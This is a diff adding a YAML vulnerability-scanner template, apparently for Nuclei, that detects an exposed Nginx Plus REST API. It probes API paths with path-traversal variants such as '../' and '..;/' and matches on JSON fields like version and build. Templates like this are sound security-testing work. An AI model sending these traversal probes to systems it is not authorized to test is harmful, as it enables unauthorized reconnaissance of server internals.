@@ -1,0 +1,57 @@
+id: nginx-api-traversal
+info:
+  name: Nginx Plus Rest API - Traversal
+  author: encodedguy,omkar7505
+  severity: high
+  description: Access to Nginx Plus Rest API was discovered.
+  reference:
+    - https://nginx.org/en/docs/http/ngx_http_api_module.html
+    - https://x.com/akshaysharma71/status/1825815869953552844
+  tags: nginx,misconfig,lfi
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api/1/nginx'
+      - '{{BaseURL}}/api/2/nginx'
+      - '{{BaseURL}}/api/3/nginx'
+      - '{{BaseURL}}/api/5/nginx'
+      - '{{BaseURL}}/api/9/nginx'
+      - '{{BaseURL}}/../api/1/nginx'
+      - '{{BaseURL}}/../api/2/nginx'
+      - '{{BaseURL}}/../api/3/nginx'
+      - '{{BaseURL}}/../api/5/nginx'
+      - '{{BaseURL}}/../api/9/nginx'
+      - '{{BaseURL}}/assets/..;/api/1/nginx'
+      - '{{BaseURL}}/assets/..;/api/2/nginx'
+      - '{{BaseURL}}/assets/..;/api/3/nginx'
+      - '{{BaseURL}}/assets/..;/api/5/nginx'
+      - '{{BaseURL}}/assets/..;/api/9/nginx'
+      - '{{BaseURL}}/..;/api/1/nginx'
+      - '{{BaseURL}}/..;/api/2/nginx'
+      - '{{BaseURL}}/..;/api/3/nginx'
+      - '{{BaseURL}}/..;/api/5/nginx'
+      - '{{BaseURL}}/..;/api/9/nginx'
+
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "version"
+          - "build"
+          - "address"
+          - "load_timestamp"
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - application/json
+
+      - type: status
+        status:
+          - 200
